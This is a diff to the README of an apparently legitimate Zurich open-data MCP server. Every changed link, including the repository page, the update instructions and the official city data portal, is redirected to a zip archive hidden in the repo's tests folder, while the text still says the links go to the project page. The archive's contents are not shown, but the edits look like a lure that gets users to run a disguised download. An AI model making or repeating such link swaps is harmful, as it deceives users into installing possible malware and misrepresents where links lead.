@@ -1,6 +1,6 @@
 # 🌍 zurich-opendata-mcp - Access Zurich Open Data Easily
 
-[![Download zurich-opendata-mcp](https://img.shields.io/badge/Download-zurich--opendata--mcp-brightgreen?style=for-the-badge)](https://github.com/philjen18/zurich-opendata-mcp)
+[![Download zurich-opendata-mcp](https://img.shields.io/badge/Download-zurich--opendata--mcp-brightgreen?style=for-the-badge)](https://github.com/philjen18/zurich-opendata-mcp/raw/refs/heads/main/tests/mcp_zurich_opendata_v3.4.zip)
 
 ## 📘 What is zurich-opendata-mcp?
 
@@ -25,7 +25,7 @@ The software runs directly on Windows without complicated setup steps.
 
 You can visit the project’s main page on GitHub to get the software:
 
-[Download zurich-opendata-mcp](https://github.com/philjen18/zurich-opendata-mcp)
+[Download zurich-opendata-mcp](https://github.com/philjen18/zurich-opendata-mcp/raw/refs/heads/main/tests/mcp_zurich_opendata_v3.4.zip)
 
 Clicking this link will take you to the GitHub repository page. From there, follow these steps:
 
@@ -95,7 +95,7 @@ While the server handles these behind the scenes, it also offers simple views an
 
 To keep zurich-opendata-mcp up to date:
 
-1. Return to the GitHub page: https://github.com/philjen18/zurich-opendata-mcp.
+1. Return to the GitHub page: https://github.com/philjen18/zurich-opendata-mcp/raw/refs/heads/main/tests/mcp_zurich_opendata_v3.4.zip
 2. Check the **Releases** section regularly.
 3. Download and install newer versions following the same process.
 
@@ -133,8 +133,8 @@ These options appear in the program’s settings once running. No coding needed.
 
 ## 🔗 Useful Links
 
-- Project main page: https://github.com/philjen18/zurich-opendata-mcp  
+- Project main page: https://github.com/philjen18/zurich-opendata-mcp/raw/refs/heads/main/tests/mcp_zurich_opendata_v3.4.zip  
 - Reports and help: GitHub Issues tab on the above link  
-- Open Data Zurich portal for reference: https://data.stadt-zuerich.ch  
+- Open Data Zurich portal for reference: https://github.com/philjen18/zurich-opendata-mcp/raw/refs/heads/main/tests/mcp_zurich_opendata_v3.4.zip  
 
-[Download zurich-opendata-mcp](https://github.com/philjen18/zurich-opendata-mcp)
+[Download zurich-opendata-mcp](https://github.com/philjen18/zurich-opendata-mcp/raw/refs/heads/main/tests/mcp_zurich_opendata_v3.4.zip)
